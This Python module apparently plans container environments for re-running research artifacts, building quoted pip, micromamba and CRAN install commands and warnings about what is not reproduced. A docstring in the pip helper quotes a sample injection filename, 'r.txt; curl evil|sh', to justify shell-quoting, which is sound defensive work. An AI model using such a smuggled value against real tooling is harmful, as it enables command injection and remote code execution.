"""Environment planning.

Decision rule (see docs/DESIGN.md §3):

    author manifest pins an image        -> use it as-is        [author-image]
    repo needs only the known sci stack  -> reprobe-base-* + overlay   [pinned-base]  (default)
    --allow-repo2docker and repo complex -> repo2docker build   [repo2docker]
    otherwise                            -> pinned-base best-effort + warn

For the MVP the pinned-base path is implemented; repo2docker is a documented
Phase-2 hook. The report always records ``env_provenance`` so a reviewer knows
whether the environment was author-specified or harness-default.
"""

from __future__ import annotations

import shlex
import shutil
from pathlib import Path
from typing import Any, Optional

import yaml

from ..config import Config
from ..docker_exec import docker_available, image_present
from ..models import DetectResult, EnvPlan


def _needs(kinds: set[str], *want: str) -> bool:
    return any(k in kinds for k in want)


# Same invocation for manifest-declared and auto-detected lockfiles: guarded so
# an image without renv fails loudly (non-zero -> install noted failed/skipped)
# instead of a cryptic traceback or a silent "ok".
_RENV_RESTORE = ("Rscript -e 'if (requireNamespace(\"renv\", quietly=TRUE)) renv::restore(prompt=FALSE) "
                 "else { message(\"renv not preinstalled in image; renv.lock NOT restored\"); quit(status=3) }'")

_R_VERSIONS = "Rscript -e 'print(installed.packages()[, c(\"Package\", \"Version\")])'"


def _cran_packages(env: dict[str, Any], detected: list[str]) -> list[str]:
    """Union of author-declared (manifest environment.r_packages) and statically
    detected R packages, validated to a safe charset and stripped of base/
    recommended packages that ship with every R."""
    from ..detect.signatures import _R_BASE_PKGS, _R_PKG_NAME_RE
    declared = env.get("r_packages") or []
    names = {str(p).strip() for p in list(declared) + list(detected or [])}
    return sorted(n for n in names if n and _R_PKG_NAME_RE.match(n) and n not in _R_BASE_PKGS)


def _cran_install_command(packages: list[str], cran_repo: str) -> str:
    """An `Rscript -e '...'` that installs only the packages that are (a) not
    already present in the image/library AND (b) available on the pinned CRAN
    snapshot, into R_LIBS_USER; anything not on CRAN is reported, never faked.

    Package names are pre-validated to ``[A-Za-z][A-Za-z0-9.]*`` (no quote/space/
    shell metacharacter), so embedding them in the double-quoted R vector inside
    the single-quoted `-e` argument cannot inject shell or R code."""
    repo = cran_repo or "https://cloud.r-project.org"
    vec = ", ".join(f'"{p}"' for p in packages)
    r_code = (
        "pkgs <- c(" + vec + "); "
        'repo <- "' + repo + '"; '
        "have <- rownames(installed.packages()); "
        "need <- setdiff(pkgs, have); "
        "if (length(need)) { "
        "avail <- tryCatch(rownames(available.packages(repos=repo)), error=function(e) character(0)); "
        "ok <- intersect(need, avail); "
        "miss <- setdiff(need, avail); "
        'if (length(ok)) install.packages(ok, repos=repo, lib=Sys.getenv("R_LIBS_USER")); '
        'if (length(miss)) message("reprobe: R packages not on CRAN (not installed): ", '
        'paste(miss, collapse=", ")); '
        # A CRAN-available package that is still missing afterwards FAILED to
        # build — surface it as a non-zero exit so the install phase is reported
        # failed (never silently "ok") and the run's step failures are read as
        # environmental. Print the resolved versions BEFORE quitting: the phase
        # runs under `set -e`, so a non-zero exit here aborts the whole bash -c
        # and the trailing version-listing command would never run — losing the
        # record of what IS installed in exactly the run that needs diagnosing.
        "failed <- setdiff(ok, rownames(installed.packages())); "
        'if (length(failed)) { message("reprobe: CRAN packages FAILED to install: ", '
        'paste(failed, collapse=", ")); '
        'print(installed.packages()[, c("Package", "Version")]); quit(status=1) } '
        "}"
    )
    return "Rscript -e '" + r_code + "'"


def _py_detected_install_command(dists: list[str], conda_prefix: Optional[str]) -> str:
    """Install statically-detected imports the environment does not already ship.

    The Python twin of ``_cran_install_command``, and it follows the same rules:
    the presence check happens INSIDE the container at install time, so nothing
    already provided by the base image (or by the artifact's own built env) is
    touched; and a name PyPI does not have is *reported*, never faked and never
    fatal — a mis-detected local module must not fail the phase.

    Distribution names are pre-validated to ``[A-Za-z0-9][A-Za-z0-9._-]*`` and
    module names to an identifier, so embedding them in the double-quoted Python
    literals inside this single-quoted ``-c`` argument cannot inject shell or
    Python code."""
    from ..detect.signatures import _PY_IMPORT_TO_DIST

    inverse = {v: k for k, v in _PY_IMPORT_TO_DIST.items()}
    # An extra gets an empty module name, which the generated code treats as
    # "always offer to pip". A presence check cannot answer for an extra:
    # find_spec("ray.tune") succeeds on the file layout alone, while importing
    # it still raises because ray[tune]'s dependencies are absent — which is the
    # exact failure this mapping exists to fix. pip is idempotent, so offering
    # an already-satisfied extra costs a no-op.
    pairs = [("" if "[" in d else inverse.get(d, d.replace("-", "_")), d) for d in dists]
    spec = ", ".join(f'("{m}", "{d}")' for m, d in pairs)
    py = f"{conda_prefix}/bin/python" if conda_prefix else "python"
    target = ', "--target=/work/.reprobe_deps"' if not conda_prefix else ""
    code = (
        "import importlib.util as u, importlib.metadata as md, subprocess, sys; "
        f"pairs = [{spec}]; "
        'norm = lambda s: s.lower().replace("_", "-"); '
        # Two independent presence checks: the module may be importable without
        # dist metadata (conda packages sometimes are), and the dist may be
        # installed under a name whose import differs from what we guessed.
        'have = {norm(getattr(x, "name", "") or "") for x in md.distributions()}; '
        "need = sorted({d for m, d in pairs "
        "if not m or (u.find_spec(m) is None and norm(d) not in have)}); "
        'print("reprobe: imports the environment does not provide:", need or "none", flush=True); '
        "fail = [d for d in need if subprocess.call([sys.executable, \"-m\", \"pip\", "
        f'"install", "--no-input"{target}, d]) != 0]; '
        'print("reprobe: pip could NOT install (reported, not faked):", fail or "none")'
    )
    return f"{py} -c '{code}'"


def plan(
    detect_result: DetectResult,
    manifest_meta: dict[str, Any],
    config: Config,
    src_dir: str | Path,
    *,
    allow_repo2docker: bool = False,
) -> EnvPlan:
    src = Path(src_dir)
    env = (manifest_meta or {}).get("environment", {}) or {}
    kinds = set(detect_result.artifact_types)
    builder = str(env.get("builder") or "")

    # 1) author pinned an image
    if env.get("image"):
        return EnvPlan(strategy="author-image", image=str(env["image"]),
                       env_provenance="author-specified")

    # choose default base image: python stack unless purely R
    py_needed = _needs(kinds, "python", "jupyter")
    r_needed = _needs(kinds, "r", "rmarkdown")
    image_key = "python" if py_needed or not r_needed else "r"
    image = config.base_image(image_key) or config.pins.get("fetch", {}).get("fallback_python_image", "")

    install, dep_warnings, conda_prefix = _install_commands(
        env, src, r_needed,
        detected_r_packages=detect_result.r_packages,
        cran_repo=config.cran_repo,
        executes_code=bool(detect_result.steps),
        notebooks=_needs(kinds, "jupyter"),
        py_needed=py_needed,
        detected_py_packages=detect_result.py_packages)

    flags = detect_result.flags
    if ("needs-repo2docker" in flags or builder == "repo2docker") and allow_repo2docker:
        # Phase 2: hand off to repo2docker_builder. For now, record intent.
        return EnvPlan(strategy="repo2docker", image=image, env_provenance="repo2docker-built",
                       install_commands=install, conda_env_prefix=conda_prefix,
                       repo2docker_version=config.pins.get("tools", {}).get("repo2docker"),
                       warnings=["repo2docker builder is a Phase-2 hook; using pinned base best-effort"]
                                + dep_warnings)

    strategy = "pinned-base"
    warnings = []
    if builder == "repo2docker":
        strategy = "besteffort"
        warnings.append("author requested builder: repo2docker; not built in this run — "
                        "re-run with --allow-repo2docker")
    elif builder == "author-image":
        warnings.append("author requested builder: author-image but pinned no image; using pinned base")
    elif builder not in ("", "pinned-base"):
        warnings.append(f"unknown builder '{builder}' in manifest; using pinned base")
    if "needs-repo2docker" in flags:
        strategy = "besteffort"
        warnings.append("repo declares system-level setup (Dockerfile/postBuild/apt.txt); "
                        "pinned base may lack some deps. Re-run with --allow-repo2docker for fidelity.")

    # Pinned base declared but not present locally: fall back to the generic
    # image (python stacks only — there is no generic R fallback) rather than
    # letting every step fail with an image-missing infra error.
    provenance = "harness-default"
    if image and docker_available() and not image_present(image):
        fallback = config.fetch_cfg.get("fallback_python_image", "")
        if image_key == "python" and fallback:
            warnings.append(f"pinned base image '{image}' is not present locally; using generic "
                            f"fallback '{fallback}' (best-effort — build the real base with "
                            "images/build-images.sh)")
            image, provenance = fallback, "fallback-generic"
        else:
            warnings.append(f"pinned base image '{image}' is not present locally and no fallback "
                            "applies — steps will report an infra error, not an artifact failure")

    return EnvPlan(strategy=strategy, image=image, env_provenance=provenance,
                   install_commands=install, conda_env_prefix=conda_prefix,
                   warnings=warnings + dep_warnings)


#: Where the install phase builds an artifact's own conda environment. Under
#: /work so it survives into the offline run phase on the same bind mount.
CONDA_ENV_PREFIX = "/work/.reprobe_env"

#: micromamba's package cache — on the install container's own filesystem, never
#: on the /work bind mount (see _conda_env_command).
_MAMBA_CACHE = "/var/tmp/reprobe-mamba"


def _case_insensitive(path: Path) -> bool:
    """True when the host filesystem folds case (Windows and macOS bind mounts).

    Conda packages whose paths differ only in case then merge silently as the
    env is built — ncurses ships share/terminfo/N and .../n — so the environment
    is not exactly the one that was solved. Cheap to probe, and worth saying."""
    probe = path / ".reprobe_case_probe"
    try:
        probe.mkdir(exist_ok=True)
        (probe / "N").write_text("", encoding="utf-8")
        return (probe / "n").exists()
    except OSError:
        return False
    finally:
        shutil.rmtree(probe, ignore_errors=True)


def _conda_env_command(env_file: str, notebooks: bool) -> str:
    """Build the artifact's declared conda environment with micromamba.

    The pinned base IS a micromamba image, so the environment an artifact
    declared can be built in the same sanctioned egress phase that installs pip
    and CRAN deps. Before this, `environment.yml` was detected, warned about, and
    ignored — and the artifact was then failed for the very import it had
    declared (`ModuleNotFoundError: torch` against an environment.yml listing
    ultralytics).

    The env file is author-controlled and reaches a `bash -c`, so quote it."""
    parts = [
        # The cache MUST NOT live on /work. /work is a host bind mount, and on a
        # Windows or macOS host that filesystem folds case — while micromamba's
        # package cache is integrity-checked file-for-file. ncurses (a hard
        # dependency of CPython) ships share/terminfo/N and .../n, which merge
        # into one entry, and the create then dies with "Invalid package cache /
        # Cannot find a valid extracted directory cache for ncurses". The install
        # phase runs with a writable rootfs, so put the cache on the container's
        # own (case-sensitive) filesystem — not /tmp, which is a 4g tmpfs that a
        # torch-sized download would overflow. It is per-container and therefore
        # not reused across runs; correctness first.
        f"export MAMBA_ROOT_PREFIX={_MAMBA_CACHE}",
        f"micromamba create -y -q -p {CONDA_ENV_PREFIX} -f {shlex.quote(env_file)}",
    ]
    if notebooks:
        # papermill/ipykernel live in the BASE image, not in the artifact's env.
        # Without them here the notebook runner would find the base image's
        # papermill on PATH and execute the notebook against the wrong
        # interpreter — the one environment.yml exists to replace.
        parts.append(f"micromamba install -y -q -p {CONDA_ENV_PREFIX} -c conda-forge "
                     "papermill ipykernel nbconvert")
    return " && ".join(parts)


def _pip_command(req_file: str, conda_prefix: Optional[str]) -> str:
    """`pip install -r <file>`, into a built conda env when there is one.

    ``req_file`` may be an untrusted manifest-declared filename that later
    reaches a `bash -c`; shell-quote it (POSIX, for the Linux install container)
    so a name like ``r.txt; curl evil|sh`` cannot inject a command."""
    quoted = shlex.quote(req_file)
    if conda_prefix:
        return f"{conda_prefix}/bin/pip install --no-input -r {quoted}"
    return f"pip install --no-input --target=/work/.reprobe_deps -r {quoted}"


def _conda_disclosures(path: Path, notebooks: bool) -> list[str]:
    """What building the env does NOT reproduce. Never let a built environment
    read as a faithful one."""
    out = [
        f"conda file '{path.name}' was built with micromamba into {CONDA_ENV_PREFIX} and the "
        "analysis runs with that interpreter. Not reproduced: conda `activate` hooks and any "
        "environment variables the author's env sets, and channel pins are resolved fresh "
        "(no lock file), so package versions may differ from the authors' run."]
    if notebooks:
        out.append("papermill/ipykernel/nbconvert were added to the artifact's environment so "
                   "notebooks could execute; they are the harness's, not the artifact's")
    if _case_insensitive(path.parent):
        out.append("this host's filesystem folds case, so conda files whose paths differ only in "
                   "case (ncurses' terminfo, for one) were merged as the environment was built — "
                   "it is close to, but not byte-identical with, the environment that was solved. "
                   "A Linux host does not have this limitation")
    try:
        spec = yaml.safe_load(path.read_text(encoding="utf-8", errors="replace")) or {}
        channels = [str(c).lower() for c in (spec.get("channels") or [])]
        if "defaults" in channels:
            out.append("environment.yml uses the Anaconda `defaults` channel, whose terms of "
                       "service restrict automated/organizational use and which may refuse the "
                       "install; conda-forge is what the harness's own base is built from")
    except Exception:
        pass
    return out


def _install_commands(env: dict[str, Any], src: Path, r_needed: bool,
                      detected_r_packages: list[str] | tuple[str, ...] = (),
                      cran_repo: str = "",
                      executes_code: bool = False,
                      notebooks: bool = False,
                      py_needed: bool = False,
                      detected_py_packages: list[str] | tuple[str, ...] = (),
                      ) -> tuple[list[str], list[str], Optional[str]]:
    """Returns (commands, warnings). Any declared or detected dependency file
    the pinned-base builder does NOT install must surface as a warning — the
    report says what was not installed (never over-claim)."""
    cmds: list[str] = []
    warnings: list[str] = []
    conda_prefix: Optional[str] = None
    dep = str(env.get("dependencies") or "")
    # explicit manifest dependency file
    if dep and not (src / dep).exists():
        warnings.append(f"manifest declares dependencies '{dep}' but the file does not exist; "
                        "auto-detecting instead")
    elif dep.endswith(".txt"):
        cmds.append(_pip_command(dep, None))
    elif dep.endswith("renv.lock"):
        cmds.append(_RENV_RESTORE)
    elif dep.endswith((".yml", ".yaml")):
        cmds.append(_conda_env_command(dep, notebooks))
        conda_prefix = CONDA_ENV_PREFIX
        warnings.extend(_conda_disclosures(src / dep, notebooks))
        if (src / "requirements.txt").is_file():
            # repo2docker applies both, and so do the authors of repos that ship
            # both. Install it INTO the env — a --target install would land on
            # PYTHONPATH, which precedes site-packages and would shadow the very
            # environment the manifest declared.
            cmds.append(_pip_command("requirements.txt", conda_prefix))
    elif dep:
        warnings.append(f"declared dependency file '{dep}' is not a supported type "
                        "(requirements.txt | environment.yml | renv.lock); it was NOT installed")
    if not cmds:
        # auto-detect common manifests (repo2docker-style conventions). Conda
        # first: when there is an env to build, pip has to install INTO it.
        conda_file = next((c for c in ("environment.yml", "environment.yaml",
                                       "binder/environment.yml") if (src / c).is_file()), None)
        if conda_file:
            cmds.append(_conda_env_command(conda_file, notebooks))
            conda_prefix = CONDA_ENV_PREFIX
            warnings.extend(_conda_disclosures(src / conda_file, notebooks))
        if (src / "requirements.txt").is_file():
            cmds.append(_pip_command("requirements.txt", conda_prefix))
        if (src / "renv.lock").is_file():
            if r_needed:
                cmds.append(_RENV_RESTORE)
            else:
                warnings.append("renv.lock present but no R steps detected; R dependencies were NOT restored")
        elif (src / "install.R").is_file():
            if r_needed:
                cmds.append("Rscript install.R")
            else:
                warnings.append("install.R present but no R steps detected; it was NOT run")
    # CRAN packages the base image lacks: author-declared (manifest r_packages)
    # + statically detected library()/require()/pkg:: usages. The install itself
    # picks only the CRAN-available, not-already-present subset (see
    # _cran_install_command) and runs in the sanctioned egress phase; the author
    # analysis still runs offline.
    cran_pkgs = _cran_packages(env, list(detected_r_packages))
    if cran_pkgs:
        if r_needed:
            cmds.append(_cran_install_command(cran_pkgs, cran_repo))
            if not cran_repo:
                warnings.append("no r.cran_snapshot pinned in pins.yaml; detected R packages install "
                                "from a live CRAN mirror (versions not reproducible across time)")
        else:
            warnings.append(f"R packages {cran_pkgs} were declared/detected but no R steps were found; "
                            "they were NOT installed")

    # Python imports the code reaches for but no manifest declares. Same policy
    # as the CRAN block above: install only what the environment lacks, report
    # what PyPI refuses. Without this, an artifact that imports shap without
    # declaring it either died on ModuleNotFoundError or — worse — passed by
    # silently borrowing the package from the harness base image.
    py_pkgs = [str(d) for d in (detected_py_packages or [])]
    if py_pkgs:
        if py_needed:
            cmds.append(_py_detected_install_command(py_pkgs, conda_prefix))
            warnings.append(
                f"{len(py_pkgs)} Python import(s) were detected statically and installed only "
                "where the environment did not already provide them: "
                + ", ".join(py_pkgs[:12]) + ("…" if len(py_pkgs) > 12 else "")
                + ". Anything in that list the artifact's own manifest does not declare is a "
                  "reproducibility defect of the artifact, not of the harness — the install log "
                  "records which were actually missing.")
        else:
            warnings.append(f"Python packages {py_pkgs} were detected but no Python steps "
                            "were found; they were NOT installed")

    # The silent case, and the most over-claimable one: the artifact declares NO
    # dependencies anywhere. Every library its code imports then comes from
    # whatever the harness base image happens to ship, so a clean run proves the
    # code works *in reprobe's environment* — not that the artifact describes the
    # environment it needs. Without this the report shows an empty warnings list
    # and a green step, which reads as "self-contained and reproducible".
    from ..detect.signatures import DEP_MANIFESTS
    if executes_code and not any((src / m).is_file() for m in DEP_MANIFESTS):
        warnings.append(
            "the artifact declares NO dependency manifest (no requirements.txt, environment.yml, "
            "renv.lock, pyproject.toml, DESCRIPTION, ...). Every library its code uses came from the "
            "harness base image, whose contents are reprobe's choice and change between years — so a "
            "passing step here does NOT show the artifact specifies its own environment, and the same "
            "code may fail on a different base. This is a reproducibility defect of the artifact.")

    # record resolved versions in the install log so two runs are comparable
    if any(c.startswith("pip install") for c in cmds):
        cmds.append("pip freeze --path=/work/.reprobe_deps")
    if any(c.startswith("Rscript") for c in cmds):
        cmds.append(_R_VERSIONS)
    if conda_prefix:
        cmds.append(f"micromamba list -p {CONDA_ENV_PREFIX}")   # resolved versions into the log
    return cmds, warnings, conda_prefix
